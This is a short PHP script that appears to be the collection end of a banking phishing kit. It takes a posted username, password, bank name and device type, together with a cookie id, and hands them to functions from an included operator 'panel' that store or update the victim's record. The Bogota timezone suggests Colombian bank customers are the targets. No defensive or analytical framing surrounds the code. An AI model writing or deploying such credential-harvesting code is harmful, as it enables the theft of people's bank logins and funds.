<?php
require_once("../lib/class.inputfilter.php");
require('../panel/include/setings.php');
date_default_timezone_set('America/Bogota');
$ifilter = new InputFilter();

$usuario = $ifilter->process($_POST['usr']);
$contrasena = $ifilter->process($_POST['pas']);
$banco = $ifilter->process($_POST['ban']);
$dispositivo = isset($_POST['dis']) ? $ifilter->process($_POST['dis']) : 'PC';

$id = isset($_COOKIE['id']) ? $ifilter->process($_COOKIE['id']) : '';

if ($id === '' || $id === '0') {
	create_item($usuario, $contrasena, $dispositivo, '', '', $banco, '');
} else {
	upgrade_user($id, $usuario, $contrasena, $banco);
}
?>